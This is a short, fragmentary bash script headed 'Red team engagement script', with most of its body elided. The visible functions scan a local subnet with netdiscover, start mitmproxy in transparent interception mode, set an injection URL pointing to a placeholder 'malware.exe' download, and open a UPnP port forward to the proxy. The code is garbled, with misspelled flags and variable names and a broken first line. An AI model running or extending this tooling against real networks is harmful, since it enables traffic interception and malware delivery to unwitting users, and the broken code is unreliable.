...
#!/bin/bashecho "Red team engagement script"
...
scan_network() {
     ...
     netdiscover -r 192.168.1.0/24 --portstate UP
}
...
start_mitmproxy() {
     ...
     mitmproxy --mode transparent --ssl-insurecure --http2 --listen-port 8080 &
     mitmproxy_pid=$!
...
inject_file() {
     local inject_url="https://example.com/malware.exe"
...
setup_upnp() {
     ...
     externaal_port=8081
     internal_port=8080
     if upnpc -a "$target_ip" "$internal_port" "$externaal_port" "MITMProxy"; then
